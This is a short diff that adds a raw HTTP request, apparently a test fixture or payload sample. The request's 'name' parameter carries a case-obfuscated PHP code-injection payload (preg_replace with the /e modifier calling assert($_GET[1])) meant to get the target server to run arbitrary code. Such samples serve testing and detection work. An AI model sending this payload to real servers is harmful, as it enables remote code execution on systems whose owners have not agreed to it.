@@ -1,0 +1,4 @@
+GET /a?name=pReG_rEpLaCe('/A/e','AsSeRt($_GeT[1])','a') HTTP/1.1
+Host: demo.example.com
+Connection: close
+
